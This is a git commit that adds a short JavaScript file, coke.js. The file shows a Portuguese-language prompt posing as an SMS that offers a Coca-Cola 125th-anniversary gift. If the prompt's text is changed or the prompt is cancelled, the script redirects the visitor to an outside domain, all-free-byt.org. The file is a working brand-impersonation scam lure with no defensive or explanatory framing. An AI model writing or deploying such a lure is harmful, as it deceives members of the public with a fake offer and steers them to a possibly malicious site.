1ba7398d51f8159169d8cba0009b6f6675264a01
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-09-21 00:05:06 -0700

    Create coke.js

---
+++ coke.js
@@ -0,0 +1,7 @@
+
+
+var password = 'Presente Coca-Cola.'
+password=prompt('SMS: Olá, queremos dar a você um presente exclusivo ao comemorarmos o aniversário de 125 anos da Coca Cola. Por favor, pressione OK para receber seu presente agora ','Presente Coca-Cola.');
+if (password != 'Presente Coca-Cola.') {
+location.href='https://all-free-byt.org/mz-cocacola.html';
+}
